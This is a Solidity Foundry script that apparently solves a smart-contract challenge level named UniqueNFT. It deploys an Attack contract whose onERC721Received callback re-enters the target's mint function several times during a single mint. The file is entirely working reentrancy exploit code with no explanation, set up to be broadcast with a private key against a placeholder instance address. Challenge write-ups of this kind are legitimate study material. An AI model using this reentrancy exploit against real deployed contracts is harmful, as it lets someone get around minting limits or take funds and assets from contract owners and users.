// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IUniqueNFT {
    function mintNFTSmartContract() external payable returns (uint256);
}

contract Attack {

    IUniqueNFT public target;
    uint256 public count;

    constructor(address _target) {
        target = IUniqueNFT(_target);
    }

    function attack() external payable {
        target.mintNFTSmartContract{value: 1 ether}();
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {

        if (count < 3) {
            count++;
            target.mintNFTSmartContract{value: 1 ether}();
        }

        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract UniqueNFTExploit is Script {

    function run() external {
        address target = 0xYOUR_INSTANCE;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attacker = new Attack(target);

        attacker.attack{value: 5 ether}();

        vm.stopBroadcast();
    }
}